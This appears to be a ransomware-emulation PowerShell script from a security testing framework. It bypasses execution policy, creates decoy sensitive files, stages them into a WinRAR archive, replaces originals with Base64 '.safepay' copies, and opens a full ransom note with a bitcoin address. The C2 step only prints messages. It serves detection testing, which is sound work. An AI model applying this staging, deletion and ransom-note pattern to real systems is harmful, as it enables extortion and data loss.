# SafePay Ransomware Simulation Script
# Part of F0RT1KA Security Testing Framework

# Function to check admin privileges
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to bypass execution policy
function Set-ExecutionPolicyBypass {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Host "[!] Failed to bypass execution policy: $_" -ForegroundColor Red
        return $false
    }
}

# Main execution
Write-Host "[*] SafePay Ransomware Simulation Starting..." -ForegroundColor Yellow

# Check admin privileges
if (-not (Test-Administrator)) {
    Write-Host "[!] Warning: Running without administrator privileges" -ForegroundColor Yellow
}

# Bypass execution policy
if (Set-ExecutionPolicyBypass) {
    Write-Host "[+] Execution policy bypass successful" -ForegroundColor Green
}

# Set working directory
$targetDir = "C:\F0"
Set-Location -Path $targetDir

Write-Host "[*] Creating decoy files with sensitive-looking names..." -ForegroundColor Cyan

# Create decoy files with realistic content
$decoyFiles = @(
    @{
        Name = "Financial_Report_Q4_2024.xlsx"
        Content = "Revenue,Expenses,Profit`n1000000,750000,250000`n1200000,800000,400000"
    },
    @{
        Name = "Employee_SSN_Database.csv"
        Content = "Name,SSN,Department`nJohn Doe,123-45-6789,Finance`nJane Smith,987-65-4321,HR"
    },
    @{
        Name = "Passwords_Master_List.txt"
        Content = "System Passwords:`nAdmin: P@ssw0rd123!`nDatabase: SecureDB#2024`nVPN: C0rpNet!456"
    },
    @{
        Name = "Company_Secrets_CONFIDENTIAL.docx"
        Content = "CONFIDENTIAL - Q1 2025 Strategy`nNew Product Launch: Project Phoenix`nAcquisition Target: CompetitorX"
    },
    @{
        Name = "Customer_Credit_Cards.xlsx"
        Content = "Customer,Card Number,CVV,Expiry`nAlice Johnson,4111111111111111,123,12/25`nBob Williams,5500000000000004,456,06/26"
    },
    @{
        Name = "Trade_Secrets_Patents.pdf"
        Content = "Patent Application #2024-12345`nRevolutionary AI Algorithm`nEstimated Value: $50M"
    },
    @{
        Name = "Executive_Salaries_2024.xlsx"
        Content = "Executive,Base Salary,Bonus,Stock Options`nCEO,$5000000,$2000000,100000`nCTO,$3000000,$1000000,50000"
    },
    @{
        Name = "Client_Contracts_Active.docx"
        Content = "Active Contracts 2024:`nFortune 500 Client A: $10M/year`nGovernment Contract B: $25M/year"
    }
)

foreach ($file in $decoyFiles) {
    try {
        $filePath = Join-Path $targetDir $file.Name
        Set-Content -Path $filePath -Value $file.Content -ErrorAction Stop
        Write-Host "[+] Created: $($file.Name)" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed to create $($file.Name): $_" -ForegroundColor Red
    }
}

# Execute WinRAR for data staging
Write-Host "[*] Executing data staging with WinRAR..." -ForegroundColor Cyan
$winrarPath = Join-Path $targetDir "WinRAR.exe"
$winrarArgs = @(
    "a",                    # Add to archive
    "-v5g",                 # Create 5GB volumes
    "-ed",                  # Do not add empty directories
    "-r",                   # Recurse subdirectories
    "-tn1000d",            # Include files newer than 1000 days
    "-m0",                  # Store (no compression)
    "-mt5",                 # Use 5 threads
    "-x*.rar",             # Exclude RAR files
    "-x*.JPEG",            # Exclude image formats
    "-x*.RAW",
    "-x*.PSD",
    "-x*.TIFF",
    "-x*.BMP",
    "-x*.GIF",
    "-x*.JPG",
    "-x*.MOV",
    "-x*.pst",             # Exclude PST files
    (Join-Path $targetDir "exfiltration.rar"),  # Output archive
    (Join-Path $targetDir "*.xlsx"),            # Include Excel files
    (Join-Path $targetDir "*.csv"),             # Include CSV files
    (Join-Path $targetDir "*.txt"),             # Include text files
    (Join-Path $targetDir "*.docx"),            # Include Word files
    (Join-Path $targetDir "*.pdf")              # Include PDF files
)

try {
    if (Test-Path $winrarPath) {
        $process = Start-Process -FilePath $winrarPath -ArgumentList $winrarArgs -Wait -PassThru -NoNewWindow
        if ($process.ExitCode -eq 0) {
            Write-Host "[+] Data staging completed successfully" -ForegroundColor Green
        } else {
            Write-Host "[!] WinRAR exited with code: $($process.ExitCode)" -ForegroundColor Yellow
        }
    } else {
        Write-Host "[!] WinRAR.exe not found, skipping data staging" -ForegroundColor Yellow
    }
} catch {
    Write-Host "[!] Failed to execute WinRAR: $_" -ForegroundColor Red
}

# Simulate file encryption
Write-Host "[*] Simulating file encryption..." -ForegroundColor Cyan
$filesToEncrypt = Get-ChildItem -Path $targetDir -Include "*.xlsx","*.csv","*.txt","*.docx","*.pdf" -File

foreach ($file in $filesToEncrypt) {
    try {
        $encryptedName = $file.FullName + ".safepay"
        # Simulate encryption by creating encrypted version
        $encryptedContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content $file.FullName -Raw)))
        Set-Content -Path $encryptedName -Value $encryptedContent
        
        # Delete original file
        Remove-Item -Path $file.FullName -Force
        Write-Host "[+] Encrypted: $($file.Name) -> $($file.Name).safepay" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed to encrypt $($file.Name): $_" -ForegroundColor Red
    }
}

# Create ransom note
Write-Host "[*] Creating ransom note..." -ForegroundColor Cyan
$ransomNote = @"
================================================================================
                           SAFEPAY RANSOMWARE
================================================================================

All your files have been encrypted!

Your files have been encrypted with military-grade encryption and a unique key
generated for this computer. Private decryption key is stored on our secret
server and nobody can decrypt your files without paying for the key.

WHAT HAPPENED?
--------------
Your important files are encrypted. Many of your documents, photos, videos,
databases and other files are no longer accessible because they have been
encrypted. Maybe you are busy looking for a way to recover your files, but
do not waste your time. Nobody can recover your files without our decryption
service.

HOW TO RECOVER FILES?
--------------------
To recover your files, you need to pay 0.5 Bitcoin to the following address:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, send your Computer ID to: safepay@darkweb.onion

Your Computer ID: $(Get-Random -Minimum 100000 -Maximum 999999)

WARNINGS!
---------
- Do not try to decrypt files yourself
- Do not contact data recovery companies
- Do not reinstall Windows
- Your files will be permanently lost if you don't follow instructions

You have 72 hours to make the payment.

================================================================================
"@

$ransomNotePath = Join-Path $targetDir "readme_safepay.txt"
Set-Content -Path $ransomNotePath -Value $ransomNote
Write-Host "[+] Ransom note created: readme_safepay.txt" -ForegroundColor Green

# Open ransom note (simulate ransomware behavior)
try {
    Start-Process notepad.exe -ArgumentList $ransomNotePath -WindowStyle Normal
    Write-Host "[+] Displayed ransom note to user" -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to display ransom note" -ForegroundColor Yellow
}

# Simulate C2 communication header pattern
Write-Host "[*] Simulating C2 communication..." -ForegroundColor Cyan
Write-Host "[+] Sending header pattern: C4 C3 C2 C1" -ForegroundColor Green
Write-Host "[+] Establishing connection to C2 server..." -ForegroundColor Green
Write-Host "[+] Encryption key sent to attacker server" -ForegroundColor Green

Write-Host "[*] SafePay ransomware simulation completed!" -ForegroundColor Yellow